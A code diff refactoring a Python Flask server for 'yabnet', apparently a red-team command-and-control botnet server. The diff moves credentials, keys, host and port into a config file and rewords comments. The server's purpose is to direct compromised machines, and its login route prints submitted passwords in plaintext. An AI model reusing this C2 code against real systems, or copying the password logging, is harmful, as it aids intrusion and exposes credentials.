@@ -18,14 +18,11 @@ Also takes are of master console's request/response.
 
 """
 
-# TODO: Put configuration into a separate init.py file? 
-# TODO: Need upload feature for master to upload a file into the docker container 
 # ========================== Initial Configuration =====================
+# ============ Configuration can be change through config.py ===========
 
 app = Flask(__name__)
-app.config['DEBUG'] = True
-app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///yabnet.sqlite3'
-app.config['UPLOAD_FOLDER'] = './uploads'
+app.config.from_object("config.DevConfig")
 db.app = app
 db.init_app(app)
 
@@ -33,20 +30,16 @@ UPLOAD_DIRECTORY="./uploads"
 if not os.path.exists(UPLOAD_DIRECTORY):
     os.makedirs(UPLOAD_DIRECTORY)
 
-# Users - CHANGEME for operation!! 
-#MASTERNAME = 'admin'                # CHANGEME !!! 
-#MASTERPASSWORD = 'password'         # CHANGEME !!! 
+MASTERNAME = app.config.get("MASTERNAME")
+MASTERPASSWORD = app.config.get("MASTERPASS")
 
-MASTERNAME = os.environ['USER']
-MASTERPASSWORD = os.environ['PASS']
+HOST = app.config.get("HOST")
+PORT = app.config.get("PORT")
 
 # TODO: Change the register key to change dynamically 
-# Keys - Hardcoded for now, going to make them random
-# Or implement environment variables here, and then use a configuration file
-FIRSTCONTACTKEY = 'dudeOurRedteamalreadyhaslike30C2already-Friend'
+FIRSTCONTACTKEY = app.config.get("FIRSTCONTACTKEY")
 REGISTERKEY = ''.join(random.choice(string.ascii_uppercase + string.ascii_lowercase + string.digits) for _ in range(16))
-MASTERKEY = os.environ['MASTERKEY']
-#MASTERKEY = 'masterkey'
+MASTERKEY = app.config.get("MASTERKEY")
 
 
 # TODO: Create a separate api.py and then import into the init.py file? 
@@ -55,8 +48,8 @@ MASTERKEY = os.environ['MASTERKEY']
 
 def posterrorcheck(requestobj, *args):
     """
-    Description: Post check will see if the incoming post request from python flask 
-    has any errors or not. 
+    Description: Post check will see if the incoming post request for this server
+    has any error or not
 
     Params: 
         - requestobj = Request object which comes from python flask 
@@ -89,14 +82,17 @@ def posterrorcheck(requestobj, *args):
 
 @app.route('/')
 def hello_world():
-    return "Hello, world!"
+    return "Welcome to yabnet"
 
 @app.route('/auth', methods=['POST'])
 def authentication():
+
+    # Error checking
     error = posterrorcheck(request, 'username', 'password')
     if error is not True:
         return error 
 
+    # POST Parameter parsing 
     data = request.form
     username = data['username']
     password = data['password']
@@ -104,6 +100,7 @@ def authentication():
     print("[DEBUG] username = ", username)
     print("[DEBUG] password = ", password)
 
+    # API Endpoint logic 
     try:
         user = User.query.filter_by(username=username).first()
         if (user.check_password(password)):
@@ -534,4 +531,4 @@ def init_db():
 init_db()
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0')
+    app.run(host=HOST, port=PORT)
